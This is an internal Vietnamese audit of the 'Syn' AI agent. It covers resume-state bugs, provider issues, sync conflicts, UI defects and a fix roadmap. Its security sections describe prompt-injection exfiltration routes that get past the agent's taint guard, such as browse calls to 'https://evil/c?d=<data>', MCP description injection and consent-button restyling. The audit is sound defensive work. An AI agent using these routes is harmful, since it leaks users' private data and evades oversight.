# Syn: kiểm toán và lộ trình thành một AI Agent mạnh

**Bản:** cập nhật 2026-09-27. Rà lại toàn bộ sau khi làm xong phase A–F.
**Bản trước:** 2026-09-26, xem lịch sử git (`cdb1152`). Phần lớn phát hiện của bản đó đã được sửa; phụ lục A tóm tắt đã làm gì.
**Nối tiếp:** `docs/syn-agent-review-2026-09-05.md`.
**Phạm vi:**
- `src-tauri/src/syn/**` (kể cả `mcp/`, `provider/`, `telegram/`);
- `commands/{syn,mcp}.rs`, `chat_engine.rs`;
- `src/mini-apps/messages/**`, `src/shared/syn/**`, phần Syn của `App.vue` và `QuickEntry.vue`;
- dữ liệu Syn ghi xuống vault.

**Cách làm:** bốn mảng rà song song — lõi agent; hành động và an toàn; tri thức và dữ liệu; UI/UX. Lần này đặc biệt soi **chỗ ghép nối** giữa các tính năng xây song song. Từng phát hiện nặng được đọc lại đúng dòng code trước khi đưa vào đây. Nhãn:
- **[đã xác minh]**: đã đọc đúng đường code;
- **[nghi ngờ]**: đường code có thật, nhưng hậu quả lúc chạy chưa quan sát được.

---

## 0. Tóm tắt cho người bận

Trong hai ngày, lộ trình A→F đã được làm hết. Syn giờ có:
- hàng rào taint dạng allowlist;
- hàm quyết định thuần (`gate`);
- quản lý cửa sổ ngữ cảnh và compaction;
- retry khi provider lỗi;
- provider Anthropic native;
- bảng năng lực model;
- danh sách bước (`update_plan`) và chế độ Plan;
- màn hình tiến độ và hộp "Việc của Syn";
- số liệu (`syn_stats`);
- sub-run (`delegate`) và resume có phát lại;
- memory có hạn xem lại, harness tự chọn skill, RAG theo đoạn kèm trích dẫn `[n]`;
- việc định kỳ;
- nạp tool theo nhóm, spreadsheet, MCP client.

| Chỉ số | 09-26 | 09-27 |
| --- | ---: | ---: |
| Dòng Rust trong `syn/` | 45.300 | **60.800** |
| Test Rust (Syn) | 752 | **~1.003** (toàn crate: 2.658) |
| Dòng frontend Syn | 9.400 | **14.400** (toàn bộ test frontend: 2.042) |
| Token tool mỗi lượt | ~5.000 | **~2.250** |
| Commit | — | 40 |

**Kết luận của lần rà này: hình dạng đã đúng, chỗ ghép thì chưa.** Từng tính năng riêng lẻ được viết cẩn thận và có test. Nhưng các tính năng được xây song song rồi gộp lại, và hầu hết lỗi nặng nằm đúng ở **chỗ chúng gặp nhau**:

1. **Lá chắn chống rò dữ liệu qua `browse` bị vượt qua trong hai lời gọi.** [đã xác minh] Một URL được coi là "đã thấy" (được phép mở) nếu nó xuất hiện trong *bất kỳ* văn bản nào quay về run, kể cả văn bản do chính model viết:
   - câu tìm kiếm được in lại (`=== YOU SEARCHED FOR: "…" ===`);
   - kết luận của run con;
   - ô spreadsheet model vừa ghi rồi đọc lại.

   Model bị trang web điều khiển chỉ cần tìm một câu chứa `https://evil/?d=<dữ liệu>` rồi mở chính URL đó. Allowlist taint vẫn đứng vững; phần hở là **nguồn gốc của URL**.
2. **Resume làm mất trạng thái.** [đã xác minh] Tiếp tục sau consent:
   - mất `plan_only`, nên một run ở chế độ Plan có thể *thực hiện luôn* các thay đổi chưa được duyệt;
   - mất danh sách link đã thấy, nên quyền vừa cấp để mở link bị từ chối;
   - mất nhóm tool đã nạp;
   - chỉ phát lại được một cấp.

   Thêm nữa, câu hỏi xin quyền (consent) chỉ sống trong bộ nhớ frontend. Một routine dừng chờ quyền lúc 7:00, hay một câu hỏi còn đó sau khi khởi động lại app, sẽ **không có chỗ nào để trả lời**.
3. **Frontend có bốn lỗi đúng/sai hiện ra khi dùng thật.** [đã xác minh]
   - Câu trả lời rơi nhầm hội thoại nếu chuyển hội thoại giữa chừng.
   - Listener không được gỡ khi turn kết thúc; AskBar đóng mà run vẫn chạy.
   - Escape ở *bất kỳ* app nào cũng dừng run của Messages, và trong một khe hẹp có thể gửi `None` — tức dừng **mọi** run, kể cả routine.
   - `onUnmounted` đăng ký sau `await` nên không bao giờ chạy.
4. **Dữ liệu đồng bộ thua âm thầm.** [đã xác minh] Quy tắc xung đột JSON của lớp sync so `metadata.updated_at`, mà mọi file JSON của Syn đều không có trường này, nên bản từ xa luôn thắng. Hậu quả:
   - `syn_index.json` (một cache) mất hội thoại vừa tạo ở máy kia;
   - `routines.json` mất `last_slot`, nên routine chạy hai lần;
   - lời từ chối đề xuất memory quay lại.
5. **Chưa có con số nào từ model thật.** Mọi gate B–F vẫn "chưa đo". Tab "Số liệu" đã có, nhưng đang đếm trùng run con.

Khuyến nghị lộ trình (chi tiết ở §8):
- **G. Vá chỗ ghép** — 1–2 tuần, ưu tiên an toàn và resume;
- **H. Đo bằng model thật** — 1 tuần;
- **I. Cấu trúc và sản phẩm**.

Không nên thêm năng lực mới trước khi xong G và H.

---

## 1. Đối chiếu: những gì đã có và điểm năng lực

| Năng lực | 09-26 | 09-27 | Còn thiếu gì |
| --- | --- | --- | --- |
| A1 Bền bỉ (25 round không vỡ ngữ cảnh) | ✗ | **Một phần** | Chưa tính token của tool vào ước lượng; compaction không được lưu; server local kiểu OpenAI bị coi là hosted (§2.3) |
| A2 Chia để trị | ✗ | **Một phần** | Có `delegate`; chưa chạy song song; run con không dùng được "chỉ lần này" |
| A3 Có kế hoạch | ✗ | **Một phần** | Có `update_plan`, chế độ Plan, tiến độ; nhưng **Plan mất khi resume** (§2.1) |
| A4 Nhớ và học | ½ | **Khá** | Nhận nhầm yêu cầu "nhớ"; khôi phục memory bị thay không có tác dụng; reflector chỉ xem 40 memory (§4.1) |
| A5 Chủ động | ✗ | **Một phần** | Routine chạy được, nhưng lỗi không báo, câu hỏi chờ không bền, `routines.json` đồng bộ sang máy khác là chạy ngay (§3.4) |
| A6 Với xa | Web | **Một phần** | Có MCP và spreadsheet; mỗi run chỉ gọi MCP được một lần; mô tả tool của server là kênh tiêm lệnh (§3.3) |
| A7 Đáng tin | Thủng | **Thủng ở chỗ khác** | Allowlist vững; lá chắn `browse` bị vượt; feed qua RAG không bật taint (§3.1–3.2) |

---

## 2. Lõi agent

### 2.1 Resume, chế độ Plan, taint: chỗ ghép hỏng nhiều nhất

| # | Lỗi | Kịch bản | Nguồn |
| --- | --- | --- | --- |
| **R1** | **Plan mất khi resume** | Bấm "Lên kế hoạch trước" → run đọc rồi xin quyền `browse` → "Chỉ lần này" → run tiếp tục với `plan_only=false` và **tạo, sửa note hay gọi MCP ghi mà chưa ai duyệt**. Phá đúng lời hứa của nút Plan. | `commands/syn.rs:862` chỉ đọc `request.plan_only`; frontend không gửi lại khi resume. [đã xác minh] |
| **R2** | Link đã thấy mất khi resume | Run đọc bài feed (taint bật, link được ghi nhận) → muốn mở một link trong đó → xin quyền → được cho phép → run tiếp tục bị **từ chối mở link**, vì `destinations` chỉ lấy từ lời người dùng, không lấy từ nội dung phát lại. Quyền cấp ra bị phí. | `engine.rs:483`; `run::replay` không đi qua `note_seen_in`. [đã xác minh] |
| **R3** | Resume chỉ một cấp | A đọc 3 note → xin browse → B tiếp tục A và browse → xin MCP → C chỉ phát lại việc của B, việc của A mất. Đúng loại việc dài mà D2 nhắm tới. | `run.rs` `replay` chỉ đi qua `stopped.steps`. [đã xác minh] |
| **R4** | Không chặn resume hai lần ở backend | Bấm hai lần (hoặc hai thiết bị) → `pending_call` chạy hai lần; một lệnh MCP ghi có thể gửi hai lần. | Không có `resumed_by`. [đã xác minh] |
| **R5** | Nhóm tool đã nạp mất khi resume | Resume phải chờ model tự `find_tools` lại. | [đã xác minh] |
| **R6** | Run con không dùng được "Chỉ lần này" | Người dùng cho phép browse một lần → cha giao việc cho run con đọc web → run con bị từ chối: "a helper cannot ask". | `engine.rs:1232` tạo run con với conversation `None`. [đã xác minh] |

**Hướng sửa chung:** resume phải mang theo *trạng thái* của run, không chỉ lời gọi cuối:
- `plan_only` và `plan`;
- nhóm tool đã nạp;
- `destinations` (lấy từ nội dung phát lại);
- cả chuỗi `resumed_from`;
- dấu `resumed_by` để từ chối resume lần hai.

Run con nhận phạm vi quyền "chỉ lần này" của cha.

### 2.2 Provider

| # | Vấn đề | Trạng thái |
| --- | --- | --- |
| P1 | **Gemini 3:** các tool call được phát lại không có `thoughtSignature`, và chính code Gemini ghi rằng thiếu nó là lỗi 400. Mọi lần tiếp tục sau consent trên Gemini 3 có thể hỏng. | Code [đã xác minh]; lỗi 400 [nghi ngờ] |
| P2 | **Anthropic:** lượt trả lời cuối không kèm tool (`answer_without_tools`, compaction) vẫn chứa khối `tool_use`/`tool_result`. API có thể từ chối. Nên gửi tool kèm `tool_choice: none`. | Code [đã xác minh]; lỗi API [nghi ngờ] |
| P3 | **Cache Anthropic không dùng hai nửa prompt:** `split_at_turn` chỉ có trong test; toàn bộ system prompt là một khối. Mỗi lần nạp nhóm tool lại làm hỏng cache vì tool đứng đầu tiền tố. Mục tiêu cache hit trên 60% của Gate B khó đạt với cách làm hiện tại. | [đã xác minh] |
| P4 | **Fallback "bỏ thinking" không được nhớ:** sau khi lịch sử bị rút gọn, mỗi vòng lại trả giá một lỗi 400 rồi mới gửi lại. | [đã xác minh] |

### 2.3 Ngữ cảnh

- **Ước lượng thiếu:** `keep_inside` chỉ đếm `working`, bỏ qua mô tả tool (khoảng 2k token trên Ollama 8k). `tools_chars` bị cũ sau khi nạp nhóm. [đã xác minh]
- **Hiệu chỉnh học sai:** hiệu chỉnh học cả từ những request mà Ollama đã cắt bớt (`prompt_eval_count` ≤ `num_ctx`), nên tỉ lệ ký tự/token trôi lên trần 6,0 và ước lượng ngày càng thấp. Vòng này tự khuếch đại. [nghi ngờ về độ lớn]
- **Server local kiểu OpenAI bị coi là hosted:** LM Studio hay llama.cpp trên localhost với cửa sổ 4k bị gán 32k–128k, nên compaction không bao giờ chạy và `delegate` vẫn được đưa ra. `capability::is_hosted` đã biết nhận ra loopback nhưng engine không dùng. [đã xác minh]
- **Compaction không được lưu:** mỗi lượt lại tóm tắt lại từ đầu, mỗi lần một văn bản khác nên phá cache; bản thân lời gọi tóm tắt cũng không dừng được. [đã xác minh]

### 2.4 Routine

- **Lỗi không ai biết:** `last_slot` được ghi trước khi chạy; nếu run lỗi (ví dụ Ollama chưa bật lúc 7:00) thì chỉ có `log::error`, không thử lại, không thông báo. [đã xác minh]
- **"Chạy ngay" có thể chồng lên lần chạy theo lịch:** `syn_run_routine_now` bỏ qua `ROUTINES_RUNNING`. [đã xác minh]
- **Nhận diện "đang chờ" thiếu:** `run_routine` chỉ coi câu trả lời rỗng là đang chờ, nên dừng để hỏi "cái nào" (có chữ) không được báo là đang chờ. [đã xác minh]

### 2.5 Sức khoẻ code

- `drive_inner` đã **to lại** (khoảng 800 dòng) vì các nhánh Plan, Delegate, FindTools, Mcp được viết thẳng vào sau khi `decide()` đã tách ra. Cần một `execute_decided()`.
- `engine.rs` 5.635 dòng, `tools.rs` 7.238, `commands/syn.rs` 3.114. `send_message_inner` giờ khoảng 100 dòng các bước — tốt.
- Khoảng 46 test kiểu "đọc mã nguồn" (`include_str!`). Không có test nào cho:
  - `start_run`, `run_routine`;
  - resume lồng nhau, resume ở chế độ Plan, resume khi đã taint;
  - run con sau "chỉ lần này";
  - lượt cuối không tool trên Anthropic hoặc Gemini.

  R1–R6 đều nằm đúng trong vùng chưa có test.

**Đã kiểm và ổn:**
- Stop lan xuống run con.
- Đệ quy `Box::pin`.
- `finish()` idempotent.
- `tools` được tính lại sau `find_tools`.
- Không giữ lock qua `await`.
- Retry không gửi lại stream đã hiện chữ.
- Không chạy routine hai lần trong cùng một khung giờ.

---

## 3. Hành động và an toàn

> Allowlist taint, thực thi trong `execute_tool` để recipe cũng phải qua, **đứng vững**: không tool mới nào bị phân loại sai, và taint đi theo run con lẫn resume. MCP được làm cẩn thận: không theo redirect, không dùng shell, bí mật để trong keychain, mỗi thiết bị phải tự tin cậy server, và kết quả được bọc ranh giới có nonce. Các lỗ dưới đây nằm ở **nguồn gốc dữ liệu**, không ở danh sách tool.

### 3.1 Nghiêm trọng: vượt lá chắn `browse`

| # | Đường vượt | Nguồn |
| --- | --- | --- |
| **S1** | **Câu tìm kiếm tự in lại.** Sau khi đã taint: `browse("x https://evil/c?d=<tóm tắt tài chính>")`. Có dấu cách nên được coi là câu tìm kiếm, không bị kiểm tra; kết quả in lại câu tìm kiếm; `note_seen_in` ghi nhận URL trong đó. Lời gọi thứ hai `browse("https://evil/c?d=…")` được cho qua. Quyền browse đã có sẵn, vì chính lần browse đầu là thứ bật taint. | `web.rs:1038`, `engine.rs:830`. [đã xác minh] |
| **S2** | **Qua `delegate`**, hai cách: (a) mục tiêu giao cho run con trở thành tin nhắn vai "user", nên host trong đó thành "site người dùng đã nêu"; (b) cha ghi nhận URL trong *kết luận* do run con viết. | `engine.rs:893`, `engine.rs:483`. [đã xác minh] |
| **S3** | **Qua spreadsheet:** ghi một ô chứa URL, đọc lại (lượt đọc nằm trong `UNTRUSTED_READS` nên URL được ghi nhận là đã thấy), rồi mở URL đó. File còn đồng bộ đi. | [đã xác minh] |

**Gốc chung:** "đã thấy" nghĩa là *mọi* URL trong văn bản quay về, bất kể ai viết. **Sửa:**
- Ghi lại mọi chuỗi model đã đưa vào tham số tool trong run; từ chối URL "đã thấy" nếu nó xuất hiện lần đầu ở đó.
- Bỏ phần in lại câu tìm kiếm (hoặc lọc URL khỏi nó).
- Run con dùng `Destinations` của cha, với danh sách host "người dùng nêu" rỗng; cha nhận *tập URL đã thấy* của run con, không nhận văn xuôi.
- Khi đã taint, lọc token dạng URL khỏi câu tìm kiếm.

### 3.2 Cao

| # | Vấn đề | Nguồn |
| --- | --- | --- |
| S4 | **`reserved_type` bỏ sót kiểu dữ liệu nội bộ.** Sau taint, `create_node` vẫn tạo được `finance_month` có `transactions`, và mã tính số dư cộng mọi node loại này. Trang web **giả mạo được số dư** — đúng thứ mà việc cấm `create_transaction` định chặn. Cũng tạo được `schema`, `view`, `json`, `canvas`. | `taint.rs:173`, `tools.rs:4104`. [đã xác minh] |
| S5 | **Feed đi qua RAG không bật taint.** Tóm tắt bài feed (`include_feeds` bật mặc định) vào prompt, nhưng run vẫn được sửa, xoá và gọi MCP. Gọi `search_feed_articles` bằng tool thì bật taint; cùng nội dung ấy đi qua RAG thì không. | `rag.rs:765-795`, `models/syn.rs:248`. [đã xác minh] |
| S6 | **Taint từ tin forward chỉ xét tin cuối.** Lượt Telegram kế tiếp ("ok") không còn taint dù đoạn forward vẫn nằm trong lịch sử. | `engine.rs:469-472`. [đã xác minh] |
| S7 | **Mô tả tool MCP là kênh tiêm lệnh không bật taint.** Mô tả tool bị giới hạn 600 ký tự và có tiền tố, nhưng mô tả của *từng tham số* được giữ tới 8.000 ký tự, không ranh giới. Chúng đến model từ lượt đầu, trước khi có taint. Khi kết nối lại, danh sách tool cùng `readOnlyHint` được chấp nhận lặng lẽ, nên server có thể đổi một tool ghi thành "chỉ đọc" để lọt vào quyền NetRead đã cấp. | `mcp/provider.rs:112,172`, `mcp/config.rs:95`. [đã xác minh] |
| S8 | **`routines.json` đồng bộ sang là chạy ngay, không cần thiết bị duyệt.** Một máy bị xâm nhập hay một vault chia sẻ có thể cài routine đọc tài chính rồi mở `evil/?d=…`. Host trong câu lệnh routine được coi là "người dùng nêu", và `Browse Always` còn hạn 90 ngày. `conversation_id` đồng bộ sang còn có thể trỏ routine vào hội thoại thật để thừa hưởng quyền "chỉ lần này" ở đó. | `routine.rs` `load`, `chat_engine.rs:64`. [đã xác minh] |
| S9 | **Model chèn được `<style>` vào câu trả lời.** Sanitizer của MessageBubble cho qua thẻ `style` và thuộc tính `style` với *văn xuôi* của model, không chỉ SVG của Mermaid. Câu trả lời bị dắt mũi có thể phủ lên, đổi kiểu hoặc đổi nhãn các nút Cho phép/Từ chối của thẻ xin quyền. | `MessageBubble.vue:215-216`. [đã xác minh] |

### 3.3 Trung bình

- **Nguồn ngoài chưa được coi là ngoài:** `search_files` trả trích đoạn PDF/Office mà không nằm trong `UNTRUSTED_READS`. Kết quả `read_file_text`, `read_feed_article`, `read_spreadsheet` không có ranh giới.
- **Tin cậy lại server MCP giữ nguyên bí mật và quyền cũ** sau khi địa chỉ bị đổi ở máy khác: quyền theo tên hiển thị, bí mật theo id.
- **"Host người dùng nêu" quá rộng:** mở được mọi đường dẫn trên host đó, kể cả redirect mở (`google.com/url?q=`).
- **Feed fetcher chưa kiểm soát SSRF:** không dùng `PublicOnly`, theo redirect 5 lần không kiểm tra lại, trong khi tải toàn văn từ link bài feed (do người viết feed kiểm soát).
- **Audit thiếu:** không ghi các lần bị từ chối vì taint/`Destinations`; ghi tham số browse chứ không ghi URL thực mở; không ghi lần ghi vault khi đã taint; `detail` bị cắt ở 300 ký tự.
- **Giả định "mỗi thiết bị" chỉ đúng với sync của Synabit:** iCloud, Dropbox hay Syncthing sẽ đồng bộ cả `.synabit/consent.json` và `mcp-trusted.json`.

### 3.4 Thấp

- "Chỉ lần này" chỉ được xoá khi run có câu trả lời; run lỗi hay bị huỷ thì quyền còn treo.
- Lệnh `edit` Telegram thiếu `link_preview_options`.
- `write_spreadsheet`: reversal ghi "Automatic" nhưng thực ra phải xoá tay; có khe TOCTOU giữa kiểm tra và ghi; ghi được vào `Syn/`.
- Một nhóm MCP có thể tới 200 tool × 8,6k ký tự, không có ngân sách cho từng nhóm.
- `is_private_ip` thiếu 6to4, Teredo, `64:ff9b:1::/48`, `fec0::/10`.
- Chế độ Plan vẫn cho `browse`, nên không chặn được đường rò.

---

## 4. Tri thức và dữ liệu

### 4.1 Memory, skill, RAG

| # | Vấn đề | Trạng thái |
| --- | --- | --- |
| K1 | **Tự ghim nhầm:** `asked_to_remember` khớp chuỗi con "remember", nên "Do you remember…?", "I don't remember" đều làm memory được ghim. | [đã xác minh] |
| K2 | **Khôi phục memory bị thay không có tác dụng:** `memory::all` ẩn mọi memory bị một memory khác trỏ `supersedes`, nên `restore_node` — "đường quay lại" mà comment hứa — vô hiệu. | [đã xác minh] |
| K3 | **Reflector chỉ thấy 40 memory**, và đề xuất không được đối chiếu với kho, nên memory cũ bị đề xuất lại. Supersede theo văn bản không nhất quán giữa reflect (so chính xác) và bước accept (bỏ dấu). Accept trash memory cũ hai lần. | [đã xác minh] |
| K4 | **Memory nhiều dòng làm sai phép đếm:** `line()` giữ nguyên xuống dòng, nên `lines_shown` và số liệu memory sai; `shrink_block` có thể cắt một memory làm đôi. | [đã xác minh] |
| K5 | **RAG đo ngân sách bằng byte nhưng cắt bằng ký tự:** vault tiếng Việt chỉ được dùng khoảng một nửa `max_context_chars`. | [đã xác minh] |
| K6 | **Trích dẫn sai số được frontend biến thành nút:** frontend so với tổng số nguồn, trong đó có cả nguồn web của tool. Backend cảnh báo `[4]` không tồn tại, nhưng `[4]` vẫn mở chip của tool. | [đã xác minh] |
| K7 | **`look_back` trả lại câu trả lời cũ như "việc của chính mình"** mà không kiểm tra run đó đã đọc nội dung ngoài hay chưa, tức nội dung ngoài được "rửa" qua một run khác. | [nghi ngờ] |
| K8 | **Harness chọn skill quá dễ dãi khi chỉ có một skill** (điểm hạng hai bằng 0). Một cụm trích dẫn một từ đã đủ ngưỡng. Câu hỏi khác ngôn ngữ với skill thì không bao giờ khớp. | [đã xác minh] |

### 4.2 Lưu trữ và đồng bộ

| # | Vấn đề | Trạng thái |
| --- | --- | --- |
| **D1** | **Mọi file JSON của Syn đều "bản từ xa luôn thắng" khi xung đột.** Hậu quả: (a) `syn_index.json` — cache nhưng vẫn đồng bộ — làm hội thoại tạo ở máy B biến mất, còn hội thoại đã xoá quay lại như bóng ma; (b) `routines.json` mất `last_slot`, nên routine chạy lại và gửi Telegram hai lần; (c) lời từ chối và đề xuất memory bị đảo lại; (d) `mcp.json`, `calibration.json` mất sửa đổi. | `sync/core/apply.rs:71-80, 427-440`. [đã xác minh] |
| D2 | **Sync đóng dấu `metadata.node_id` vào file bằng đọc-sửa-ghi không khoá, còn Syn bỏ trường đó mỗi lần lưu.** Mỗi bước run bị ghi hai lần và đẩy lên hai lần; nếu Syn ghi đúng lúc sync đang ghi thì có thể mất một bước. | Churn [đã xác minh]; mất dữ liệu [nghi ngờ] |
| D3 | **Không có version schema; các enum không có `#[serde(other)]`.** Máy chạy bản cũ đọc một run có `Trigger::Schedule` sẽ hỏng cả file. | [nghi ngờ] |
| D4 | **`Syn/runs/results/*` đồng bộ đi toàn văn kết quả tool** (trang web, file, dữ liệu Jira qua MCP), và vào git nếu vault nằm trong git. `mcp.json` có thể chứa token trong query string hay tham số stdio. | [đã xác minh] |
| D5 | **Dọn run theo mtime** (sync làm thay đổi mtime) và không chừa run đang chờ, nên resume có thể phát lại rỗng. `rebuild_index` coi mọi `Syn/*.json` là hội thoại. Slot routine theo giờ địa phương, nên đổi múi giờ có thể chạy hai lần. | [đã xác minh] |

### 4.3 Số liệu và eval

- **`syn_stats` đếm trùng:** token của run con được cộng cả vào cha lẫn tổng; run con và run tiếp tục đều tính là run, làm lệch tỉ lệ chạm trần. Cần loại run có `parent_run_id`.
- **Eval offline** `whether_the_answer_reaches_the_prompt` chỉ in ra, không assert, nên con số 10/13 có thể tụt mà không ai biết. Nó đo "câu trả lời có vào prompt", không đo "model trả lời đúng".

---

## 5. UI/UX

### 5.1 Lỗi đúng/sai

| # | Lỗi | Nguồn |
| --- | --- | --- |
| **U1** | **Câu trả lời rơi nhầm hội thoại:** `handleSendMessage` không kiểm tra `onScreen()` (các nhánh consent và choice thì có). Quay lại hội thoại A thì không thấy tiến độ, và người dùng lại gửi được lượt thứ hai song song. | `MessagesApp.vue:495`. [đã xác minh] |
| **U2** | **`clearStreaming` không gỡ listener.** AskBar đóng giữa chừng: run không dừng, lần mở sau hiện câu trả lời cũ đang stream. | `useSynChat.ts:203`. [đã xác minh] |
| **U3** | **Escape toàn cục dừng run:** hai handler (MessagesApp và ChatPanel) cùng gắn vào `window` và còn sống sau keep-alive, nên Escape để đóng modal ở app khác cũng dừng run Messages. Nếu `activeConversationId` rỗng thì gửi `None`, tức **dừng mọi run**, kể cả routine và Telegram. | `MessagesApp.vue:914`, `useSynChat.ts:189`. [đã xác minh] |
| **U4** | **`onUnmounted` đăng ký sau `await`** nên không bao giờ chạy: listener resize/keydown và bộ poll model dồn lên sau mỗi lần mount lại. | `MessagesApp.vue:924`. [đã xác minh] |
| **U5** | **Câu hỏi chờ trả lời chỉ ở trong bộ nhớ**, và chỉ một ô duy nhất: câu hỏi thứ hai đè câu thứ nhất; khởi động lại thì mất; "Việc của Syn" báo "đang chờ bạn" nhưng mở hội thoại ra không có thẻ nào. | `useSynConsent.ts:41`. [đã xác minh] |
| U6 | Chữ trên thẻ lựa chọn đã lỗi thời: `choice_explainer` vẫn nói "đặt vào ô soạn". 10 khoá tiếng Việt còn dùng "tao/mày" cạnh 43 khoá dùng "bạn". | [đã xác minh] |
| U7 | AskBar và QuickEntry gửi khi nhấn Enter mà không kiểm tra `isComposing`, nên bộ gõ Telex/VNI dễ gửi nhầm. AskBar hiển thị `[n]` dạng chữ thô. Nút consent không bị khoá khi đang gửi, và lỗi trả lời không được hiện ra. | [đã xác minh] / [nghi ngờ] |

### 5.2 Kiến trúc thông tin

- **Có khoảng 10 lối vào** (Messages, Cmd+J, nút trên chrome và mobile, QuickEntry, bôi đen, thread, thông báo, Telegram, tìm kiếm, pane). Tốt cho độ phủ.
- **Sidebar quá tải:** bốn mục cố định (Việc của Syn, Việc định kỳ, Thông báo, SYN.md) nằm *dưới* danh sách hội thoại vốn dài ra mãi — mỗi lần dùng AskBar lại thêm một hội thoại. Badge "đang chờ bạn", thứ duy nhất cần người dùng, bị trôi khỏi màn hình. Hai dòng số liệu dành cho dev cũng nằm ở đây.
- **Settings chỉ vào được khi đang mở một hội thoại.** Từ Activity, Routines hay trên mobile thì không vào được. Trong Settings trộn hai kiểu lưu: form chính cần bấm Lưu, còn Telegram và MCP tự lưu.
- **RunInspector vẫn là console cho dev:** 1.426 dòng, 7 tab; trên mobile hàng tab tràn ra ngoài.

### 5.3 Trợ năng

- **Tốt:**
  - vùng `aria-live` của RunProgress được mount sẵn;
  - trạng thái từng bước có chữ `sr-only`;
  - dùng `aria-pressed`, `role="switch"`;
  - các nút thao tác của tin nhắn hiện ra khi focus hoặc trên màn hình cảm ứng.
- **Còn thiếu:**
  - hàng hội thoại và thread trong sidebar là `div` nhấp chuột, không có tabindex hay role;
  - các nút đổi tên/xoá chỉ hiện khi hover;
  - drawer Settings và Inspector không có `role="dialog"` hay quản lý focus;
  - không báo cho trình đọc màn hình khi câu trả lời kết thúc hoặc khi thẻ consent xuất hiện;
  - nút consent chỉ cao khoảng 24px.

### 5.4 Code và chính sách trình duyệt

- **Kích thước file:** MessageBubble 1.456, RunInspector 1.426, MessagesApp 1.315, AskBar 630, SynSettings 606.
- **Test:** 30 file spec; chỉ **1 mount test**; 19 test đọc mã nguồn. U1–U5 đều là loại lỗi mà test đọc mã nguồn không bắt được.
- **Logic trùng lặp:** luồng resume bị chép giữa MessagesApp và AskBar.
- **Chính sách trình duyệt:** tuân thủ trong phạm vi Syn. Lưu ý toàn app: Tailwind v4 giả định Safari 16.4+, trong khi `minimumSystemVersion` vẫn chưa được đặt.

---

## 6. Danh sách sửa, theo mức độ

Ghi chú: "Ước lượng" là kích thước công việc (S nhỏ, M vừa, L lớn).

| Ưu tiên | Mục | Ước lượng |
| --- | --- | --- |
| 1 | S1–S3: nguồn gốc URL "đã thấy"; run con dùng `Destinations` của cha | M |
| 2 | R1: mang `plan_only`, `plan` và nhóm tool qua resume; R4: `resumed_by` | S |
| 3 | S4: `reserved_type` chặn cả kiểu nội bộ (`finance_*`, `schema`, `view`, `json`, `canvas`…) | S |
| 4 | S5, S6: bật taint khi RAG đưa vào đoạn feed/file; taint forward theo cả hội thoại | S |
| 5 | U1–U4: `onScreen`, gỡ listener, Escape cục bộ, `onUnmounted` đúng chỗ | S |
| 6 | S9: bỏ `style` khỏi sanitizer cho văn xuôi | S |
| 7 | U5 + R-chain: câu hỏi chờ bền (map theo `run_id`, nạp lại từ các run đang chờ, trả lời được từ Activity); không dọn run đang chờ | M |
| 8 | S8: routine phải được từng thiết bị duyệt (theo hash); kiểm tra `check()` khi nạp | M |
| 9 | D1: bỏ `syn_index.json` khỏi sync hoặc dựng lại từ file; quy tắc gộp cho `routines.json`, `declined.json`, `proposals.json` | M |
| 10 | S7: rào mô tả tham số MCP; đưa hash danh sách tool vào dấu tin cậy của server | M |
| 11 | P1, P2: chữ ký thay thế cho Gemini; `tool_choice: none` cho Anthropic | S |
| 12 | R2, R6, §2.3: nhận nội dung phát lại vào `destinations`; phạm vi quyền của run con; tính token của tool; nhận ra server local | M |
| 13 | K1–K6, số liệu đếm trùng, eval assert | M |
| 14 | U6, U7, sidebar, trợ năng | M |

---

## 7. So sánh với "agent mạnh"

Năm việc còn thiếu, theo thứ tự quan trọng:

1. **Trạng thái bền.** Một agent làm việc dài phải dừng, chờ và tiếp tục mà không mất gì — cả khi qua đêm, khởi động lại hay đổi máy. Syn đã có bản ghi `Run` rất tốt nhưng chưa dùng nó làm nguồn sự thật cho resume và cho câu hỏi đang chờ.
2. **Chứng minh bằng số.** Chưa có gate nào đo với model thật. Đây là khoảng trống lớn nhất về *thông tin*: không ai biết compaction, chọn skill, trích dẫn hay routine có thực sự tốt hơn không.
3. **Mô hình tin cậy theo nguồn gốc.** Taint hiện là một bit cho cả run. Bước tiếp theo đúng là theo dõi *từng chuỗi* đến từ đâu (tham số model viết, trang web, người dùng). S1–S3 là triệu chứng của việc thiếu điều này.
4. **Song song và nhiều bước với dịch vụ ngoài.** Chưa chạy đọc song song (DB một kết nối), và mỗi run chỉ gọi MCP một lần. Việc thứ hai cần một thiết kế "tiếp tục có xác nhận", không phải nới luật.
5. **Tự kiểm.** Chưa có bước kiểm lại câu trả lời trước khi gửi (ngoài việc đối chiếu URL và số trích dẫn).

---

## 8. Lộ trình tiếp theo

### Phase G: Vá chỗ ghép (1–2 tuần)

Mục 1–12 ở §6. Mỗi lỗ an toàn phải có **test theo hình dạng tấn công** trong bộ scripted-provider: S1 tìm kiếm tự in lại, S2 qua run con, S3 qua spreadsheet, S4 giả số dư, S5 feed qua RAG, S6 forward rồi "ok". Mỗi lỗi resume phải có test cho `start_run`: resume ở chế độ Plan, resume lồng nhau, resume khi đã taint rồi mở link.

**Gate G:**
- Mọi test tấn công ở trên đều bị chặn.
- Mount test cho U1–U5 qua được.
- Một routine dừng chờ quyền, sau khi khởi động lại app, vẫn trả lời được từ "Việc của Syn".

### Phase H: Đo bằng model thật (khoảng 1 tuần)

- **Gate B:** Ollama 8k × 25 round và tỉ lệ cache hit trên Anthropic.
- **Gate D:** sub-run đọc feed tuần; tỉ lệ skill được dùng.
- **Gate E:** một tuần routine thật.
- **Gate F:** một việc Jira qua MCP; audit log đọc hiểu được.
- Chạy `rag_vs_agentic` với model thật và biến bản offline thành assert có ngưỡng.
- Tab "Số liệu" bỏ run con khỏi các tổng.

### Phase I: Cấu trúc và sản phẩm

- `execute_decided()`: kéo các nhánh How ra khỏi `drive_inner`.
- Tách MessageBubble, RunInspector, MessagesApp; gom luồng resume vào `useSynChat`.
- Chuyển những gì người dùng cần từ RunInspector ra các màn hình riêng: "Số liệu", "Quyền"; ghim các mục cố định lên đầu sidebar; cho vào Settings từ mọi nơi.
- Pool kết nối SQLite chỉ-đọc để chạy tool đọc song song.
- Thiết kế cho MCP nhiều bước (đọc tiếp từ cùng server với tham số lấy từ lời người dùng hoặc URL đã thấy thật sự).
- `Trigger::VaultEvent`.
- Tầng ngữ nghĩa (embedding): chỉ làm khi eval có từ 40 câu trở lên và FTS thiếu rõ ràng.

---

## 9. Không nên làm

- **Không thêm năng lực mới trước khi xong G và H.** Hai ngày vừa qua cho thấy tốc độ xây vượt tốc độ kiểm; mỗi tính năng thêm vào lúc này là thêm một chỗ ghép chưa được test.
